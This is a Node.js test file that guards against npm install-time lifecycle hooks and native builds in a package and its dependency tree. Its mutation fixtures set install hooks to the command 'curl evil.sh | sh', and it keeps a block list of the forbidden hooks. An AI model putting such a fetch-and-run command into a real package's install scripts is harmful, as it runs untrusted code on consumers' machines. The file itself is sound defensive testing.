/**
 * T-008 §5 — criterion 6 ("no lifecycle scripts") as a check that can actually FAIL.
 *
 * The tempting evidence — "`npm ci --ignore-scripts` succeeded" — proves nothing: it succeeds BY
 * SUPPRESSING scripts, so it passes identically whether or not the manifest declares them. And
 * calling the criterion "vacuously satisfied because we added no dependency" would weaken the
 * repo rule that every claim needs a check that can fail.
 *
 * So the check is a pure function over the manifest, run against the real package.json (must
 * pass) and against a mutated fixture per forbidden key (each must fail). The forbidden set is
 * the CONSUMER install-time hooks — the ones npm runs on a registry install of a dependency:
 *
 *   preinstall, install, postinstall
 *
 * `prepare`/`prepack` are deliberately NOT forbidden: the packaging contract REQUIRES both (they
 * build `dist/` at pack time and on git-URL installs, where building is the point), and they do
 * not run on a registry install of a dependency. A check that forbade them would contradict a
 * test that requires them, and the suite would be unsatisfiable.
 *
 * Run: node --test spikes/lifecycle.test.mjs
 */
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { existsSync, readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { test } from "node:test";

const REPO = join(dirname(fileURLToPath(import.meta.url)), "..");
export const FORBIDDEN_HOOKS = ["preinstall", "install", "postinstall"];
export const FORBIDDEN_FIELDS = ["author", "contributors", "maintainers"];

/** Pure so the fixture mutations below can drive every branch. Returns violations, not a bool. */
export function manifestViolations(manifest) {
  const violations = [];
  for (const hook of FORBIDDEN_HOOKS) {
    if (manifest.scripts?.[hook] !== undefined) {
      violations.push(`scripts.${hook}: runs arbitrary code on every consumer install`);
    }
  }
  for (const field of FORBIDDEN_FIELDS) {
    if (manifest[field] !== undefined) violations.push(`${field}: no personal attribution ships`);
  }
  return violations;
}

/**
 * The same rule applied to EVERY package a consumer would install, not just ours.
 *
 * The manifest check above only ever read the root package.json, so adding a runtime dependency
 * that declares its own `postinstall`, or that compiles on install, left the whole gate green while
 * plainly violating criterion 6 — a consumer installs the transitive tree, not our manifest
 * (review round 14). The scan is offline: it reads the manifests already resolved in node_modules.
 */
/**
 * Every installed package DIRECTORY in an `npm ls --json` tree, keyed by path rather than name.
 *
 * Exported and pure so the traversal itself is falsifiable: the first version collected a Set of
 * NAMES and then looked each up at `node_modules/<name>`, which collapsed multiple versions of one
 * package and skipped anything nested under a parent's own node_modules. A clean hoisted copy then
 * masked a nested copy carrying a postinstall or a binding.gyp, and the gate passed over a tree that
 * violated it (review round 15). A real fixture for that needs a genuine nested install, so the
 * traversal is separated from the filesystem and driven by a synthetic tree instead.
 */
export function collectPackagePaths(tree, repoDir) {
  const paths = new Set();
  (function walk(node, parentDir) {
    for (const [name, child] of Object.entries(node.dependencies ?? {})) {
      // `npm ls --long` reports each node's real location; fall back to the conventional nesting
      // when it does not, so an older npm degrades to "checks something" rather than to silence.
      const dir = child.path ?? join(parentDir, "node_modules", name);
      paths.add(dir);
      walk(child, dir);
    }
  })(tree, repoDir);
  return paths;
}

export function treeViolations(packages) {
  const violations = [];
  for (const { name, manifest, hasBindingGyp } of packages) {
    for (const hook of FORBIDDEN_HOOKS) {
      if (manifest.scripts?.[hook] !== undefined) {
        violations.push(`${name} declares scripts.${hook}: it would run on every consumer install`);
      }
    }
    // Native compilation, by either of the two ways npm triggers it.
    if (hasBindingGyp) violations.push(`${name} ships a binding.gyp: node-gyp would build it on install`);
    if (manifest.gypfile) violations.push(`${name} sets gypfile: node-gyp would build it on install`);
  }
  return violations;
}

test("the REAL package.json passes the check", () => {
  const manifest = JSON.parse(readFileSync(join(REPO, "package.json"), "utf8"));
  assert.deepEqual(manifestViolations(manifest), []);
  // Belt and braces: the check must be running against a manifest that actually declares
  // scripts, or an empty read would pass everything vacuously.
  assert.ok(Object.keys(manifest.scripts).length > 0, "the manifest under test is the real one");
});

test("the check's own vocabulary matches an INDEPENDENT literal oracle", () => {
  // Review round 1: the mutation loop below originally iterated FORBIDDEN_HOOKS/FIELDS — the
  // same arrays the implementation reads — so deleting "postinstall" from the array would have
  // weakened check and test together, invisibly. These literals are the oracle; the arrays must
  // match them exactly, and the mutations below use the literals, never the arrays.
  assert.deepEqual([...FORBIDDEN_HOOKS].sort(), ["install", "postinstall", "preinstall"]);
  assert.deepEqual([...FORBIDDEN_FIELDS].sort(), ["author", "contributors", "maintainers"]);
});

test("mutation: EVERY forbidden key, inserted into a fixture, is caught — from the literal oracle", () => {
  const clean = { name: "fixture", version: "0.0.0", scripts: { build: "tsc" } };
  assert.deepEqual(manifestViolations(clean), [], "the fixture itself is clean");
  for (const hook of ["preinstall", "install", "postinstall"]) {
    const mutated = { ...clean, scripts: { ...clean.scripts, [hook]: "curl evil.sh | sh" } };
    assert.equal(manifestViolations(mutated).length, 1, `scripts.${hook} must be caught`);
  }
  for (const field of ["author", "contributors", "maintainers"]) {
    const mutated = { ...clean, [field]: "someone" };
    assert.equal(manifestViolations(mutated).length, 1, `${field} must be caught`);
  }
});

test("prepare/prepack are permitted — the packaging contract REQUIRES them, so forbidding them here would make the suite unsatisfiable", () => {
  const withBuildHooks = {
    name: "fixture", version: "0.0.0",
    scripts: { prepack: "npm run build", prepare: "npm run build" },
  };
  assert.deepEqual(manifestViolations(withBuildHooks), []);
});

test("EVERY production dependency passes the same rule, not just our own manifest", () => {
  // Criterion 6 is about what a CONSUMER install executes, and that is the whole production tree.
  // The root-manifest check above cannot see a dependency's postinstall or a package that compiles
  // on install, so it would have stayed green through exactly the change the criterion forbids.
  //
  // Resolved from the real lockfile-installed tree via `npm ls --omit=dev`, so this measures what
  // would actually be installed rather than a hand-maintained list.
  const listed = spawnSync("npm", ["ls", "--omit=dev", "--all", "--json", "--long"], {
    cwd: REPO, encoding: "utf8", timeout: 60_000, killSignal: "SIGKILL",
  });
  assert.equal(listed.error, undefined, `npm ls was killed rather than finishing: ${listed.error?.message}`);
  const tree = JSON.parse(listed.stdout);
  // Collected by installed PATH, not by name. Keying on names collapsed multiple versions of the
  // same package and skipped anything installed under a parent's nested node_modules — so a clean
  // hoisted copy could mask a nested one carrying a postinstall or a binding.gyp, and the gate
  // passed while the tree violated it (review round 15).
  const paths = collectPackagePaths(tree, REPO);
  assert.ok(paths.size > 0, "precondition: the production tree was actually enumerated");

  const packages = [];
  for (const dir of paths) {
    // Optional per-platform binaries are not installed on other platforms; absent is not a
    // violation, and asserting otherwise would fail on Linux for a correct tree.
    if (!existsSync(join(dir, "package.json"))) continue;
    const manifest = JSON.parse(readFileSync(join(dir, "package.json"), "utf8"));
    packages.push({
      name: `${manifest.name}@${manifest.version} (${dir})`,
      manifest,
      hasBindingGyp: existsSync(join(dir, "binding.gyp")),
    });
  }
  assert.ok(packages.length > 0, "precondition: at least one installed dependency was inspected");
  assert.deepEqual(treeViolations(packages), []);
});

test("the tree rule can FAIL — one fixture per way a dependency violates criterion 6", () => {
  // Without these the test above is satisfied by a tree that happens to be clean, which says
  // nothing about whether the rule works.
  const clean = { name: "ok", manifest: { scripts: { build: "tsc" } }, hasBindingGyp: false };
  assert.deepEqual(treeViolations([clean]), []);

  for (const hook of ["preinstall", "install", "postinstall"]) {
    const bad = { name: "evil", manifest: { scripts: { [hook]: "curl evil.sh | sh" } }, hasBindingGyp: false };
    assert.equal(treeViolations([bad]).length, 1, `a dependency's ${hook} must be caught`);
  }
  assert.equal(treeViolations([{ name: "native", manifest: {}, hasBindingGyp: true }]).length, 1,
    "a binding.gyp means node-gyp compiles it on install");
  assert.equal(treeViolations([{ name: "native2", manifest: { gypfile: true }, hasBindingGyp: false }]).length, 1,
    "and so does the gypfile flag");
});

test("the dependency traversal reaches NESTED copies, not just the hoisted one", () => {
  // The defect this pins: collecting names and resolving each at node_modules/<name> returns the
  // clean hoisted copy and never visits the nested one, so a dependency carrying a postinstall
  // inside a parent's own node_modules is invisible while the gate reports success.
  const tree = {
    dependencies: {
      alpha: {
        path: "/repo/node_modules/alpha",
        dependencies: {
          // Same NAME as the hoisted copy, different version, nested location.
          beta: { path: "/repo/node_modules/alpha/node_modules/beta" },
        },
      },
      beta: { path: "/repo/node_modules/beta" },
    },
  };
  const paths = collectPackagePaths(tree, "/repo");
  assert.equal(paths.size, 3, `expected all three installed directories, got: ${[...paths].join(", ")}`);
  assert.ok(paths.has("/repo/node_modules/alpha/node_modules/beta"),
    "the NESTED beta must be visited; collecting names would have returned only the hoisted one");
  assert.ok(paths.has("/repo/node_modules/beta"), "and the hoisted beta too");

  // And without `path` (older npm), the conventional nesting is reconstructed rather than dropped.
  const noPaths = collectPackagePaths({ dependencies: { a: { dependencies: { b: {} } } } }, "/repo");
  assert.deepEqual([...noPaths].sort(), ["/repo/node_modules/a", "/repo/node_modules/a/node_modules/b"]);
});
